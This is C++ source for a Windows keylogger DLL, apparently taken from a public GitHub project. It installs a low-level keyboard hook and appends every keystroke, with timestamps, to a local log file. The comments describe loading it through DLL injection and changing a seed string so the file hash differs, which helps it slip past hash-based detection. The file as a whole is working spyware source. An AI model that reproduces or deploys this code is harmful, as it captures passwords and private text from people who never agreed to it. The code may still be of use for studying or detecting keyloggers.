// Copyright (c) 2019 Ivan Šincek
// Check the original code at https://github.com/ivan-sincek/keylogger.

#include "pch.h"
#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <windows.h>
#include <fstream>
#include <ctime>

// NOTE: Change the seed to change the file hash.
std::string seed = "3301Kira";

std::string logFile = "keylogger.log";

void Write(std::string data) {
	std::ofstream stream(logFile.c_str(), (std::ios::app | std::ios::binary));
	if (!stream.fail()) {
		stream.write(data.c_str(), data.length());
		stream.close();
	}
}

void LogTime() {
	time_t now = time(NULL);
	struct tm time = { };
	char buffer[48] = "";
	if (now == -1 || localtime_s(&time, &now) != 0 || strftime(buffer, sizeof(buffer), "%H:%M:%S %m-%d-%Y", &time) == 0) {
		Write("<time>N/A</time>");
	}
	else {
		Write(std::string("<time>").append(buffer).append("</time>"));
	}
}

bool capital = false, numLock = false, shift = false;

void Prepare() {
	LogTime();
	capital = GetKeyState(VK_CAPITAL);
	numLock = GetKeyState(VK_NUMLOCK);
}

// NOTE: Do not change the name of this method. This method is required.
// NOTE: Feel free to change the content of this method - make your own hook procedure.
extern "C" __declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
		if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
			shift = wParam == WM_KEYDOWN ? true : false;
		}
		else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			switch (keystroke->vkCode) {
				case 0x41: { Write(capital ? (shift ? "a" : "A") : (shift ? "A" : "a")); break; }
				case 0x42: { Write(capital ? (shift ? "b" : "B") : (shift ? "B" : "b")); break; }
				case 0x43: { Write(capital ? (shift ? "c" : "C") : (shift ? "C" : "c")); break; }
				case 0x44: { Write(capital ? (shift ? "d" : "D") : (shift ? "D" : "d")); break; }
				case 0x45: { Write(capital ? (shift ? "e" : "E") : (shift ? "E" : "e")); break; }
				case 0x46: { Write(capital ? (shift ? "f" : "F") : (shift ? "F" : "f")); break; }
				case 0x47: { Write(capital ? (shift ? "g" : "G") : (shift ? "G" : "g")); break; }
				case 0x48: { Write(capital ? (shift ? "h" : "H") : (shift ? "H" : "h")); break; }
				case 0x49: { Write(capital ? (shift ? "i" : "I") : (shift ? "I" : "i")); break; }
				case 0x4A: { Write(capital ? (shift ? "j" : "J") : (shift ? "J" : "j")); break; }
				case 0x4B: { Write(capital ? (shift ? "k" : "K") : (shift ? "K" : "k")); break; }
				case 0x4C: { Write(capital ? (shift ? "l" : "L") : (shift ? "L" : "l")); break; }
				case 0x4D: { Write(capital ? (shift ? "m" : "M") : (shift ? "M" : "m")); break; }
				case 0x4E: { Write(capital ? (shift ? "n" : "N") : (shift ? "N" : "n")); break; }
				case 0x4F: { Write(capital ? (shift ? "o" : "O") : (shift ? "O" : "o")); break; }
				case 0x50: { Write(capital ? (shift ? "p" : "P") : (shift ? "P" : "p")); break; }
				case 0x51: { Write(capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break; }
				case 0x52: { Write(capital ? (shift ? "r" : "R") : (shift ? "R" : "r")); break; }
				case 0x53: { Write(capital ? (shift ? "s" : "S") : (shift ? "S" : "s")); break; }
				case 0x54: { Write(capital ? (shift ? "t" : "T") : (shift ? "T" : "t")); break; }
				case 0x55: { Write(capital ? (shift ? "u" : "U") : (shift ? "U" : "u")); break; }
				case 0x56: { Write(capital ? (shift ? "v" : "V") : (shift ? "V" : "v")); break; }
				case 0x57: { Write(capital ? (shift ? "w" : "W") : (shift ? "W" : "w")); break; }
				case 0x58: { Write(capital ? (shift ? "x" : "X") : (shift ? "X" : "x")); break; }
				case 0x59: { Write(capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break; }
				case 0x5A: { Write(capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break; }
				case 0x30: { Write(shift ? ")" : "0"); break; }
				case 0x31: { Write(shift ? "!" : "1"); break; }
				case 0x32: { Write(shift ? "@" : "2"); break; }
				case 0x33: { Write(shift ? "#" : "3"); break; }
				case 0x34: { Write(shift ? "$" : "4"); break; }
				case 0x35: { Write(shift ? "%" : "5"); break; }
				case 0x36: { Write(shift ? "^" : "6"); break; }
				case 0x37: { Write(shift ? "&" : "7"); break; }
				case 0x38: { Write(shift ? "*" : "8"); break; }
				case 0x39: { Write(shift ? "(" : "9"); break; }
				case VK_OEM_1: { Write(shift ? ":"  : ";" ); break; }
				case VK_OEM_2: { Write(shift ? "?"  : "/" ); break; }
				case VK_OEM_3: { Write(shift ? "~"  : "`" ); break; }
				case VK_OEM_4: { Write(shift ? "{"  : "[" ); break; }
				case VK_OEM_5: { Write(shift ? "|"  : "\\"); break; }
				case VK_OEM_6: { Write(shift ? "}"  : "]" ); break; }
				case VK_OEM_7: { Write(shift ? "\"" : "'" ); break; }
				case VK_OEM_PLUS:   { Write(shift ? "+" : "="); break; }
				case VK_OEM_COMMA:  { Write(shift ? "<" : ","); break; }
				case VK_OEM_MINUS:  { Write(shift ? "_" : "-"); break; }
				case VK_OEM_PERIOD: { Write(shift ? ">" : "."); break; }
				case VK_SPACE:    { Write(" "); break; }
				case VK_NUMPAD0:  { Write("0"); break; }
				case VK_NUMPAD1:  { Write("1"); break; }
				case VK_NUMPAD2:  { Write("2"); break; }
				case VK_NUMPAD3:  { Write("3"); break; }
				case VK_NUMPAD4:  { Write("4"); break; }
				case VK_NUMPAD5:  { Write("5"); break; }
				case VK_NUMPAD6:  { Write("6"); break; }
				case VK_NUMPAD7:  { Write("7"); break; }
				case VK_NUMPAD8:  { Write("8"); break; }
				case VK_NUMPAD9:  { Write("9"); break; }
				case VK_MULTIPLY: { Write("*"); break; }
				case VK_ADD:      { Write("+"); break; }
				case VK_SUBTRACT: { Write("-"); break; }
				case VK_DECIMAL:  { Write(","); break; }
				case VK_DIVIDE:   { Write("/"); break; }
				case VK_BACK:     { Write("[BACKSPACE]"); break; }
				case VK_TAB:      { Write("[TAB]"      ); break; }
				case VK_RETURN:   { Write("[ENTER]"    ); break; }
				case VK_MENU:     { Write("[ALT]"      ); break; }
				case VK_ESCAPE:   { Write("[ESC]"      ); break; }
				case VK_PRIOR:    { Write("[PG UP]"    ); break; }
				case VK_NEXT:     { Write("[PG DN]"    ); break; }
				case VK_END:      { Write("[END]"      ); break; }
				case VK_HOME:     { Write("[HOME]"     ); break; }
				case VK_LEFT:     { Write("[LEFT]"     ); break; }
				case VK_UP:       { Write("[RIGHT]"    ); break; }
				case VK_RIGHT:    { Write("[RIGHT]"    ); break; }
				case VK_DOWN:     { Write("[DOWN]"     ); break; }
				case VK_PRINT:    { Write("[PRINT]"    ); break; }
				case VK_SNAPSHOT: { Write("[PRT SC]"   ); break; }
				case VK_INSERT:   { Write("[INSERT]"   ); break; }
				case VK_DELETE:   { Write("[DELETE]"   ); break; }
				case VK_LWIN:     { Write("[WIN KEY]"  ); break; }
				case VK_RWIN:     { Write("[WIN KEY]"  ); break; }
				case VK_CAPITAL:  { capital = !capital;   break; }
				case VK_NUMLOCK:  { numLock = !numLock;   break; }
				case VK_LCONTROL: { if (wParam == WM_KEYDOWN) { Write("[CTRL]"); } break; }
				case VK_RCONTROL: { if (wParam == WM_KEYDOWN) { Write("[CTRL]"); } break; }
				case VK_F1:  { Write("[F1]" ); break; }
				case VK_F2:  { Write("[F2]" ); break; }
				case VK_F3:  { Write("[F3]" ); break; }
				case VK_F4:  { Write("[F4]" ); break; }
				case VK_F5:  { Write("[F5]" ); break; }
				case VK_F6:  { Write("[F6]" ); break; }
				case VK_F7:  { Write("[F7]" ); break; }
				case VK_F8:  { Write("[F8]" ); break; }
				case VK_F9:  { Write("[F9]" ); break; }
				case VK_F10: { Write("[F10]"); break; }
				case VK_F11: { Write("[F11]"); break; }
				case VK_F12: { Write("[F12]"); break; }
				default: {
					DWORD dWord = keystroke->scanCode << 16;
					dWord += keystroke->flags << 24;
					char otherKey[16] = "";
					if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0) {
						Write(otherKey);
					}
				}
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// NOTE: Do not change the name of this method. This method is required.
// NOTE: Change the return value (i.e. hook type) as necessary.
extern "C" __declspec(dllexport) int GetHookType() {
	// return WH_CALLWNDPROC;
	// return WH_CALLWNDPROCRET;
	// return WH_CBT;
	// return WH_DEBUG;
	// return WH_FOREGROUNDIDLE;
	// return WH_GETMESSAGE;
	// return WH_JOURNALPLAYBACK;
	// return WH_JOURNALRECORD;
	// return WH_KEYBOARD;
	return WH_KEYBOARD_LL;
	// return WH_MOUSE;
	// return WH_MOUSE_LL;
	// return WH_MSGFILTER;
	// return WH_SHELL;
	// return WH_SYSMSGFILTER;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		// NOTE: You can also try to play with this.
		case DLL_PROCESS_ATTACH: { // NOTE: This case will run on DLL load once per process - e.g. upon DLL injection.
			Prepare();
			break;
		}
		case DLL_PROCESS_DETACH: { // NOTE: This case will run on DLL unload once per process.
			break;
		}
		case DLL_THREAD_ATTACH:  { // NOTE: This case will run on DLL load multiple times per process.
			break;
		}
		case DLL_THREAD_DETACH:  { // NOTE: This case will run on DLL unload multiple times per process.
			break;
		}
	}
	return TRUE;
}
